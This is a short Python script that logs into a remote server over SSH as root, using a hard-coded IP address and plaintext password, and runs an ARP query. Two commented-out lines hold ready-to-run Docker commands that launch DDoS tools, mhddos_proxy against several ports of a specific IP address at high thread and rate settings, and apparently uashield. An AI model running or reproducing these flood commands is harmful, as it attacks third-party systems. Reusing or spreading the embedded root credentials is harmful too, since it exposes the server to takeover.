from netmiko_test import Netmiko

net_conn = Netmiko(host='164.92.238.74', username='root', password='@Ubuntu123a', device_type='linux')

#cmd = 'docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest  tcp://80.87.197.227:22 tcp://80.87.197.227:80 tcp://80.87.197.227:443 tcp://80.87.197.227:80  -t 1000 -p 1200 --rpc 1000  --debug' 
#cmd1 = "docker run -d ghcr.io/opengs/uashield:latest 512 true &"

cmd1 = "show arp"
output = net_conn.send_command(cmd1)
net_conn.send_command_timing("disable")
dir(net_conn)

print(output)